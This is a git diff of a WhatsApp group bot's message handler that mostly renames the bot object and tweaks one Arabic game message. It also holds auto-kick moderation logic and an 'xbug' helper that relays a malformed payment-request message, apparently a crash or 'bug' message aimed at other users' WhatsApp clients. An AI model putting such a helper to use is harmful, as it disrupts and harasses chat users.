@@ -102,7 +102,7 @@ let xeonyaudio = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne
 let xeonyimage = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/image.json'));
 let xeonyvideo = JSON.parse(fs.readFileSync('./XeonMedia/theme/Media-Store-Karne-Ke-Liye/video.json'));
 
-module.exports = ElgazarBot = async (ElgazarBot, m, chatUpdate, store) => {
+module.exports = Elza3emgonBot = async (Elza3emgonBot, m, chatUpdate, store) => {
     try {
 var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
 var budy = (typeof m.text == 'string' ? m.text : '')
@@ -111,7 +111,7 @@ const isCmd = body.startsWith(prefix)
 const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
 const args = body.trim().split(/ +/).slice(1)
 const pushname = m.pushName || "No Name"
-const botNumber = await ElgazarBot.decodeJid(ElgazarBot.user.id)
+const botNumber = await Elza3emgonBot.decodeJid(Elza3emgonBot.user.id)
 const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const itsMe = m.sender == botNumber ? true : false
 const text = q = args.join(" ")
@@ -165,7 +165,7 @@ if (cek == null) return null
 		
 	
 // Group
-        const groupMetadata = m.isGroup ? await ElgazarBot.groupMetadata(m.chat).catch(e => {}) : ''
+        const groupMetadata = m.isGroup ? await Elza3emgonBot.groupMetadata(m.chat).catch(e => {}) : ''
         const groupName = m.isGroup ? groupMetadata.subject : ''
         const participants = m.isGroup ? await groupMetadata.participants : ''
         const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
@@ -266,7 +266,7 @@ return list[Math.floor(Math.random() * list.length)]
 }
 
 // Public & Self
-if (!ElgazarBot.public) {
+if (!Elza3emgonBot.public) {
     if (!m.key.fromMe) return
 }
 function randomNomor(angka){
@@ -275,25 +275,25 @@ return Math.floor(Math.random() * angka) + 1
 const hsjdh = randomNomor(5)
 
 //auto react all message
-/////ElgazarBot.sendMessage(m.chat, {
+/////Elza3emgonBot.sendMessage(m.chat, {
           ////react: {
             ////////////////////////////////////////text: `${pickRandom(['😨','😅','😂','😳','😎', '🥵', '😱', '🐦', '🙄', '🐤','🗿','🐦','🤨','🥴','😐','👆','😔', '👀','👎'])}`,
             ////key: m.key,
           /////}})
 
 //auto recording all
-    if (global.autoRecord) { if (m.chat) { ElgazarBot.sendPresenceUpdate('recording', m.chat) }
+    if (global.autoRecord) { if (m.chat) { Elza3emgonBot.sendPresenceUpdate('recording', m.chat) }
 }
 //autotyper all
-  if (global.autoTyping) { if (m.chat) { ElgazarBot.sendPresenceUpdate('composing', m.chat) }
+  if (global.autoTyping) { if (m.chat) { Elza3emgonBot.sendPresenceUpdate('composing', m.chat) }
 }
 
 // total hit
         global.hit = {}
 if (isCmd) {
-data = await fetchJson('https://api.countapi.xyz/hit/ElgazarBot-md/visits')
+data = await fetchJson('https://api.countapi.xyz/hit/Elza3emgonBot-md/visits')
 jumlahcmd = `${data.value}`
-dataa = await fetchJson(`https://api.countapi.xyz/hit/ElgazarBot-md${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
+dataa = await fetchJson(`https://api.countapi.xyz/hit/Elza3emgonBot-md${moment.tz('Asia/Kolkata').format('DDMMYYYY')}/visits`)
 jumlahharian = `${dataa.value}`
 }
 
@@ -323,7 +323,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 "isAnimated": false
 }}}
 const xbug = (teks) => {
-  ElgazarBot.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
+  Elza3emgonBot.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'INR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //-------------------End--------------------\\
 //Dont edit ot recode or bug wont work
 
@@ -348,7 +348,7 @@ detectLinks: false,
     //reply fake
 	//group target \\
 const reply = (teks) => {
-           ElgazarBot.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
+           Elza3emgonBot.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": ` ${global.botname}`,"body": `${ownername}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),"sourceUrl": `${linkz}`}}}, { quoted: m})
         }
 
 	//button
@@ -359,7 +359,7 @@ footer: desc1,
 buttons: but,
 headerType: 1
 }
-ElgazarBot.sendMessage(id, butonna, options)
+Elza3emgonBot.sendMessage(id, butonna, options)
 }
 const http = randomNomor(500)
 
@@ -397,19 +397,19 @@ let buttonMessage = {
      mediaType: 1
    }}
        }
-   ElgazarBot.sendMessage(m.chat, buttonMessage, options)
+   Elza3emgonBot.sendMessage(m.chat, buttonMessage, options)
    }
                 
         // Autosticker gc
         if (isAutoSticker) {
             if (/image/.test(mime) && !/webp/.test(mime)) {
                 let mediac = await quoted.download()
-                await ElgazarBot.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                await Elza3emgonBot.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                 console.log(`Auto sticker detected`)
             } else if (/video/.test(mime)) {
                 if ((quoted.msg || quoted).seconds > 11) return
                 let mediac = await quoted.download()
-                await ElgazarBot.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
+                await Elza3emgonBot.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
             }
         }
         
@@ -417,13 +417,13 @@ let buttonMessage = {
         if (Antilinkgc) {
         if (budy.match(`chat.whatsapp.com`)) {
         if (!isBotAdmins) return m.reply(`${mess.botAdmin}, to kick the person who send link`)
-        let gclink = (`https://chat.whatsapp.com/`+await ElgazarBot.groupInviteCode(m.chat))
+        let gclink = (`https://chat.whatsapp.com/`+await Elza3emgonBot.groupInviteCode(m.chat))
         let isLinkThisGc = new RegExp(gclink, 'i')
         let isgclink = isLinkThisGc.test(m.text)
-        if (isgclink) return ElgazarBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
-        if (isAdmins) return ElgazarBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
-        if (isCreator) return ElgazarBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
-        await ElgazarBot.sendMessage(m.chat,
+        if (isgclink) return Elza3emgonBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nYou won't be kicked by a bot because what you send is a link to this group`})
+        if (isAdmins) return Elza3emgonBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to post any link`})
+        if (isCreator) return Elza3emgonBot.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\nOwner has sent a link, owner is free to post any link`})
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -432,8 +432,8 @@ let buttonMessage = {
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-			ElgazarBot.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+			Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending group link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
             }            
         }
         
@@ -446,7 +446,7 @@ if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
 kice = m.sender
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -455,8 +455,8 @@ kice = m.sender
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
 } else {
 }
   if (antiWame)
@@ -467,7 +467,7 @@ if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
 kice = m.sender
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -476,15 +476,15 @@ kice = m.sender
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Has been kicked because of sending wa.me link in this group`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
 } else {
 }
 //antivirtex by xeon
   if (antiVirtex) {
   if (budy.length > 3500) {
   if (!isBotAdmins) return m.reply(mess.botAdmin)
-          await ElgazarBot.sendMessage(m.chat,
+          await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -493,8 +493,8 @@ ElgazarBot.sendMessage(from, {text:`\`\`\`「 Wa.me Link Detected 」\`\`\`\n\n@
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-			ElgazarBot.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+			Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Virus Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending virus in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
   }
   }
 //anti bad words by xeon
@@ -508,7 +508,7 @@ bvl = `\`\`\`「 منع السب 」\`\`\`\n\nأنت تستخدم كلمة سي�
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -517,8 +517,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 منع السب 」\`\`\`\n\n@${m.sender.split("@")[0]} تم طرده بسبب السب في الجروب`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 منع السب 」\`\`\`\n\n@${m.sender.split("@")[0]} تم طرده بسبب السب في الجروب`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})}
 }
 //antilink youtube video by xeon
 if (AntiLinkYoutubeVid)
@@ -528,7 +528,7 @@ bvl = `\`\`\`「 YoutTube Video Link Detected 」\`\`\`\n\nAdmin has sent a yout
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -537,8 +537,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 YouTube Video Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube video link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
 //antilink youtube channel by xeon
@@ -549,7 +549,7 @@ bvl = `\`\`\`「 YoutTube Channel Link Detected 」\`\`\`\n\nAdmin has sent a yo
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -558,8 +558,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 YouTube Channel Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending youtube channel link in this group`, contextInfo:{mentionedJid:[m.sendet]}}, {quoted:m})
 } else {
 }
 //antilink instagram by xeon
@@ -570,7 +570,7 @@ bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin has sent a instagram
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -579,8 +579,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending instagram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
 //antilink facebook by xeon
@@ -591,7 +591,7 @@ bvl = `\`\`\`「 Facebook Link Detected 」\`\`\`\n\nAdmin has sent a facebook l
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -600,8 +600,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Facebook Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending facebook link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
 //antilink telegram by xeon
@@ -613,7 +613,7 @@ bvl = `\`\`\`「 Telegram Link Detected 」\`\`\`\n\nAdmin has sent a telegram l
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -622,8 +622,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Telegram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending telegram link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
 //antilink tiktok by xeon
@@ -634,7 +634,7 @@ bvl = `\`\`\`「 Tiktok Link Detected 」\`\`\`\n\nAdmin has sent a tiktok link,
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -643,8 +643,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 Tiktok Link - اترك رابط تيكتوكDetected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Tiktok Link - اترك رابط تيكتوكDetected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending tiktok link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
 //antilink twitter by xeon
@@ -655,7 +655,7 @@ bvl = `\`\`\`「 Twitter Link Detected 」\`\`\`\n\nAdmin has sent a twitter lin
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -664,8 +664,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 Tiktok Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending twitter link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
 } else {
 }
 //antilink all by xeon
@@ -676,7 +676,7 @@ bvl = `\`\`\`「 منع الروابط 」\`\`\`\n\nاوه انت مشرف لا 
 if (isAdmins) return m.reply(bvl)
 if (m.key.fromMe) return m.reply(bvl)
 if (isCreator) return m.reply(bvl)
-        await ElgazarBot.sendMessage(m.chat,
+        await Elza3emgonBot.sendMessage(m.chat,
 			    {
 			        delete: {
 			            remoteJid: m.chat,
@@ -685,8 +685,8 @@ if (isCreator) return m.reply(bvl)
 			            participant: m.key.participant
 			        }
 			    })
-			ElgazarBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
-ElgazarBot.sendMessage(from, {text:`\`\`\`「 منع الروابط 」\`\`\`\n\n@${m.sender.split("@")[0]} تم اكتشاف رابط سيتم طردك في خلال 0 ثانيه 
+			Elza3emgonBot.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
+Elza3emgonBot.sendMessage(from, {text:`\`\`\`「 منع الروابط 」\`\`\`\n\n@${m.sender.split("@")[0]} تم اكتشاف رابط سيتم طردك في خلال 0 ثانيه 
  
 لقد حظرتك من الروابط لماذا لم تسمع الكلام.  
  
@@ -701,28 +701,28 @@ ElgazarBot.sendMessage(from, {text:`\`\`\`「 منع الروابط 」\`\`\`\n\
         for (let anji of xeonysticker){
 				if (budy === anji){
 					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
-					ElgazarBot.sendMessage(m.chat, { sticker: result }, { quoted: m })
+					Elza3emgonBot.sendMessage(m.chat, { sticker: result }, { quoted: m })
 					}
 			}
 			  if (Autoreply)
 			for (let anju of xeonyaudio){
 				if (budy === anju){
 					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
-					ElgazarBot.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+					Elza3emgonBot.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
 					}
 			}
 			  if (Autoreply)
 			for (let anjh of xeonyimage){
 				if (budy === anjh){
 					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
-					ElgazarBot.sendMessage(m.chat, { image: result }, { quoted: m })
+					Elza3emgonBot.sendMessage(m.chat, { image: result }, { quoted: m })
 					}
 			}
 			  if (Autoreply) 
 					for (let anjh of xeonyvideo){
 				if (budy === anjh){
 					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
-					ElgazarBot.sendMessage(m.chat, { video: result }, { quoted: m })
+					Elza3emgonBot.sendMessage(m.chat, { video: result }, { quoted: m })
 					}
 				  }
 
@@ -740,7 +740,7 @@ emoji.get(satu)
 .then(emoji => {
 const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
 const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
-ElgazarBot.sendMessage(from, buttonMessage, {quoted:m})
+Elza3emgonBot.sendMessage(from, buttonMessage, {quoted:m})
 })
 } catch (e) {
 m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
@@ -751,10 +751,10 @@ if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in globa
 let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
 let { text, mentionedJid } = hash
 let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
-    userJid: ElgazarBot.user.id,
+    userJid: Elza3emgonBot.user.id,
     quoted: m.quoted && m.quoted.fakeObj
 })
-messages.key.fromMe = areJidsSameUser(m.sender, ElgazarBot.user.id)
+messages.key.fromMe = areJidsSameUser(m.sender, Elza3emgonBot.user.id)
 messages.key.id = m.key.id
 messages.pushName = m.pushName
 if (m.isGroup) messages.participant = m.sender
@@ -763,7 +763,7 @@ let msg = {
     messages: [proto.WebMessageInfo.fromObject(messages)],
     type: 'append'
 }
-ElgazarBot.ev.emit('messages.upsert', msg)
+Elza3emgonBot.ev.emit('messages.upsert', msg)
 }
 
 //guess song
@@ -771,7 +771,7 @@ ElgazarBot.ev.emit('messages.upsert', msg)
             kuis = true
             jawaban = tebaklagu[m.sender.split('@')[0]]
             if (budy.toLowerCase() == jawaban) {
-                await ElgazarBot.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, ElgazarBot.user.name, m)
+                await Elza3emgonBot.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, Elza3emgonBot.user.name, m)
                 delete tebaklagu[m.sender.split('@')[0]]
             } else m.reply('*Wrong answer!*')
         }
@@ -827,15 +827,15 @@ ${arr.slice(0, 3).join('')}
 ${arr.slice(3, 6).join('')}
 ${arr.slice(6).join('')}
 
-${isWin ? `@${winner.split('@')[0]} لقد فزت✨` : isTie ? `انتهت اللعبه` : `دور ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
+${isWin ? `@${winner.split('@')[0]} مبروك فزت ياكبير🤙✨` : isTie ? `انتهت اللعبه` : `دور ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
 ❌: @${room.game.playerX.split('@')[0]}
 ⭕: @${room.game.playerO.split('@')[0]}
 
 اكتب *surrender* للاستسلام والاعتراف بالهزيمة`
 	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
 	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
-	    if (room.x !== room.o) await ElgazarBot.sendText(room.x, str, m, { mentions: parseMention(str) } )
-	    await ElgazarBot.sendText(room.o, str, m, { mentions: parseMention(str) } )
+	    if (room.x !== room.o) await Elza3emgonBot.sendText(room.x, str, m, { mentions: parseMention(str) } )
+	    await Elza3emgonBot.sendText(room.o, str, m, { mentions: parseMention(str) } )
 	    if (isTie || isWin) {
 	    delete this.game[room.id]
 	    }
@@ -849,7 +849,7 @@ ${isWin ? `@${winner.split('@')[0]} لقد فزت✨` : isTie ? `انتهت ال
 	    let tie = false
 	    if (m.sender == roof.p2 && /^(acc(ept)?|نعم|yes|okay?|لا|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
 	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
-	    ElgazarBot.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
+	    Elza3emgonBot.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
 	    delete this.suit[roof.id]
 	    return !0
 	    }
@@ -857,19 +857,19 @@ ${isWin ? `@${winner.split('@')[0]} لقد فزت✨` : isTie ? `انتهت ال
 	    roof.asal = m.chat
 	    clearTimeout(roof.waktu)
 	    //delete roof[roof.id].waktu
-	    ElgazarBot.sendText(m.chat, `حسنا يمكنك الاختيار في شات البوت الخاص و عد الي المجموعه للاطلاع علي النتيجه
+	    Elza3emgonBot.sendText(m.chat, `حسنا يمكنك الاختيار في شات البوت الخاص و عد الي المجموعه للاطلاع علي النتيجه
 
 @${roof.p.split`@`[0]} and 
 @${roof.p2.split`@`[0]}
 
 من فضلك اذهب الي شات البوت واختر منه https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
-	    if (!roof.pilih) ElgazarBot.sendText(roof.p, `من فضلك اختر \n\حجر🗿\nورقه📄\nمقص✂️`, m)
-	    if (!roof.pilih2) ElgazarBot.sendText(roof.p2, `من فضلك اختر \n\nحجر🗿\nورقه📄\nمقص✂️`, m)
+	    if (!roof.pilih) Elza3emgonBot.sendText(roof.p, `من فضلك اختر \n\حجر🗿\nورقه📄\nمقص✂️`, m)
+	    if (!roof.pilih2) Elza3emgonBot.sendText(roof.p2, `من فضلك اختر \n\nحجر🗿\nورقه📄\nمقص✂️`, m)
 	    roof.waktu_milih = setTimeout(() => {
